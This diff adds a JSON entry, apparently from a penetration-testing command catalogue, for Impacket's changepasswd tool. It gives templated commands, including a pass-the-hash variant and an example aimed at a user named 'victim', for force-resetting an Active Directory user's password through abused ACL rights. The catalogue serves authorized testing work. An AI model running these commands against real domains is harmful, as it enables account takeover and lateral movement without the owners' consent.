@@ -1,0 +1,31 @@
+{
+  "id": "impacket-changepasswd",
+  "name": "Impacket changepasswd",
+  "command": "impacket-changepasswd '<domain>/<user>:<password>'@'<ip>' -newpass '<new_password>' -altuser '<target_user>'",
+  "description": "Change an AD user's password via RPC (requires appropriate ACL rights)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "rpc",
+    "smb"
+  ],
+  "tags": [
+    "impacket",
+    "password-change",
+    "acl",
+    "force-change-password",
+    "rpc"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-changepasswd -hashes ':<hash>' '<domain>/<user>'@'<ip>' -newpass '<new_password>' -altuser '<target_user>'"
+    }
+  ],
+  "examples": [
+    "impacket-changepasswd 'CORP.LOCAL/user:password'@192.168.1.100 -newpass 'NewPass123!' -altuser 'victim'"
+  ]
+}
